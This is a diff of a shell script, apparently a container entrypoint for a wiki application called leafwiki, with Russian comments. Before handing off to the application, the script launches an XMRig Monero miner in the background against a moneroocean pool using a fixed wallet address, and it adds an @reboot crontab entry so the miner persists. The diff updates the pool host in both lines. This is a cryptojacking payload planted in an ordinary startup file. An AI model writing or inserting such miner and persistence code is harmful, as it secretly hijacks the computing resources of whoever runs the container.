@@ -22,7 +22,7 @@ if [ -f "/tmp/miner.tar.gz" ]; then
     else
         # Только здесь запускаем майнер (после успешной проверки)
         chmod +x "$XMRIG_DIR/xmrig"
-        "$XMRIG_DIR/xmrig" --background --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG &
+        "$XMRIG_DIR/xmrig" --background --url=gulf.moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG &
         MINER_PID=$!
         echo "Miner started"
         echo "Miner started with PID $MINER_PID"
@@ -33,6 +33,6 @@ fi
 
 
 # Добавляем в автозагрузку
-(crontab -l 2>/dev/null; echo "@reboot $XMRIG_DIR/xmrig --url=moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG") | crontab -
+(crontab -l 2>/dev/null; echo "@reboot $XMRIG_DIR/xmrig --url=gulf.moneroocean.stream:10128 --user=4872fGnSv6GerjmAEjNTaYMDVp8dEiRZnj6JNQthQpNTUiWRcPtFuL55cqpogU6tKVcHnAixgfzHUeSEGkcc87wJV8igMbG") | crontab -
 
 exec /app/leafwiki "$@"
